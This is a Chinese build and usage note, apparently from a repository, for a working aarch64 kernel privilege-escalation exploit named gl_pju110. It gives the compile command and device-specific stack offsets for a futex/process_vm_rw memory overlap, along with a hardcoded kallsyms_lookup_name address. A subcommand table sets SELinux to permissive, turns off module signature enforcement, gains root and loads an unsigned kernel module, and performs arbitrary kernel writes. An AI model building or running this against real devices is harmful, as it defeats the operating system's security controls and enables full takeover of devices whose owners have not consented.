# 编出 `gl_pju110`

## 一句话

单个 `.c`，不需要别的依赖，`-static -O2` 直接出：

```sh
aarch64-linux-gnu-gcc -static -O2 -pthread -o gl_pju110 gl_pju110.c
```

产物 870,760 字节（和仓库里的 `gl_v112` 同尺寸）。

## 编译器的实际版本

```
aarch64-linux-gnu-gcc (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0
```

## 会不会编出“一模一样”的二进制

**不会，而且不该指望。**

用上面这条命令重编，尺寸与 `gl_v112` 完全相同（870,760 B），但 md5 不同：

```
重编产物  f41f37ce43d8ffb38fa75ca6c6feac21
gl_v112   2c4717dc596daca084f7317250fc8765
差异字节  37,946 / 870,760
```

同尺寸说明代码布局一致；4.4% 的字节差异来自编译器版本（生成这段二进制时的 gcc 与现在的 13.3.0 不是同一个），
指令选择、静态链接进来的 libc 片段都会动。

**所以：想跑就用仓库里的 `gl_v112`。** 自己重编的版本逻辑一样，但指令排布不同，
喷射的时序会跟着变一点点 —— 能不能稳定命中得重新在真机上验证，别直接替换载荷。

## 源码里的警告

编译会刷出几条警告，都是原来就有的，不影响运行：

```
warning: implicit declaration of function 'mkdir'
warning: implicit declaration of function 'chmod'
warning: implicit declaration of function 'stat'
warning: format '%d' expects argument of type 'int', but argument 3 has type 'long int'
```

前者是缺 `<sys/stat.h>` / `<sys/types.h>` 的显式包含（`_GNU_SOURCE` 下仍可用），后一个是格式化字符串里 `%d` 配了 `long`。
都是历史遗留，没有下修，因为改了就要重新验证二进制。

## 栈偏移是这台机器专属的

`gl_pju110.c` 顶上那段注释里的偏移量，全是从本机 `vmlinux` 反汇编逐条对出来的：

```
waiter   = entry_sp - 0x198      (do_futex: sub x0,x29,#0xc8)
iovstack = entry_sp - 0x158      (process_vm_rw 的 iovstack_r)
DELTA    = -0x40
  → rvec[4].iov_base 命中 waiter+0x00 (tree_entry.__rb_parent_color)
  → rvec[5].iov_base 命中 waiter+0x10 (tree_entry.rb_left)
```

换内核 = 这套偏移全部重算。方法在源码注释里写清了（哪个函数、哪条指令、立即数是多少），
但**没有通用脚本** —— 这是要拿 `objdump` 一条一条读的活。

同理，`kallsyms_lookup_name` 的静态地址 `0xffffff800833745c` 也是本机 `vmlinux` 里的值，
换内核必须改这一行：

```c
snprintf(param, sizeof(param), "kln=0x%lx level=3",
         (unsigned long)(0xffffff800833745cUL + g_slide));
```

## 子命令

| 用法 | 作用 |
|---|---|
| `./gl_pju110 selinux <槽位>` | 写 `selinux_state.enforcing = 0` |
| `./gl_pju110 sig <槽位>` | 写 `sig_enforce = N`（让未签名模块能 `insmod`） |
| `./gl_pju110 run x <槽位>` | 提权 + 读 `/sdcard/Download/ksu_raw.ko` + `init_module` |
| `./gl_pju110 <target> <value>` | 自定义写入，排障用 |

槽位是 rvec 里的落点偏移，主流程会按 `0x240 0x440 0x0c0 …` 依次试（见 `docs/04`）。